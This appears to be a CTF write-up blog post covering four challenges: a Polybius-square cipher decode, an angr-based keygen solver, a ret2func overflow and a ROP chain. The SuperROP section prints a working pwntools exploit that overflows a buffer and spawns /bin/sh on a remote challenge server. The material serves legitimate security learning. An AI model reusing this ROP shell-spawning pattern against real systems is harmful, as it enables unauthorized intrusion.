---
layout : default
---

# CompTIA Secure - IT 2019
06-10-2019

I secured first place in this CTF :)

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/comptia/score.JPG)

## Secure Password (RE)

I analysed the binary and got the following key character mapping. According to this matrix, 11=a 12=b 13=c etc.

```
  1  2  3  4  5
1 a  b  c  d  e
2 f  g  h i/j k
3 l  m  n  o  p
4 q  r  s  t  u
5 v  w  x  y  z
```

```py
flag_chars = "abcdefghijklmnopqrstuvwxyz"
chars_mapping = ['11', '12', '13', '14', '15', '21', '22', '23', '24', '24', '25', '31', '32', '33', '34', '35', '41', '42', '43', '44', '45', '51', '52', '53', '54', '55']

given = "3254431513454215214533134424343324433344431513454215"
tmp = [given[i]+given[i+1] for i in range(0, len(given), 2)]

flag = ''.join(flag_chars[chars_mapping.index(i)] for i in tmp)

print flag
```

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/comptia/secure_flag.JPG)

FLAG: CTFHUB{mysecurefunctionisntsecure}

## Keygen me (RE)

We need to fulfil some constraints to find a valid key for this software.

```py
import angr
import claripy

p = angr.Project("/bin/true")
state = p.factory.entry_state()
STRLEN = 45
flag_nums = [claripy.BVS("flag_%d" % i, 32) for i in range(STRLEN)]

summm = 0
a = "CTFHUB-"
for i in range(len(a)):
	flag_nums[i] = ord(a[i])

for i in range(0, 45):
	state.solver.add(flag_nums[i] >= 33,flag_nums[i] <= ord("z"))
	summm += flag_nums[i]

state.solver.add(summm == 1769)


flag = [state.solver.eval(i) for i in flag_nums]

print flag[::]

print ''.join(chr(i) for i in flag)
```

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/comptia/keygen.JPG)

FLAG: CTFHUB{dat_w4s_BaD_l1c3ns3_ch3ck}

## Babybof (PWN)

This was simple ret2func exploit.

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/comptia/babybof_flag.JPG)

FLAG: CTFHUB{dat_w4s_just_w4RmuP}

## SuperROP (PWN)

```py
from pwn import *


#r = process("./superrop")
r = remote('165.22.223.31', 9000)

print r.read()


payload = 'A'*56
payload += p64(0x400596) # pop rdi, ret
payload += p64(0x400658) # /bin/sh string
payload += p64(0x400577) # run_cmd address

r.sendline(payload)
r.interactive()
```

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/comptia/rop_flag.JPG)

FLAG: CTFHUB{da_r0p_g0es_skkkkrrrt}

---
